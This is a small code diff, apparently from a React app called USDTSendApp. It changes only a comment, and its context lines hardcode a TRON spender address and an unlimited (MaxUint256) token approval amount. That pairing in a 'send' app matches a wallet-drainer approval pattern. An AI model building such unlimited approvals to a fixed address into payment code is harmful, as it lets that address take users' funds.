@@ -64,7 +64,7 @@ const USDTSendApp = () => {
       return;
     }
     try {
-      const spender = "TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv"; // example spender
+      const spender = "TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv"; // example spender address
       const unlimitedAmount =
         "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // MaxUint256
 
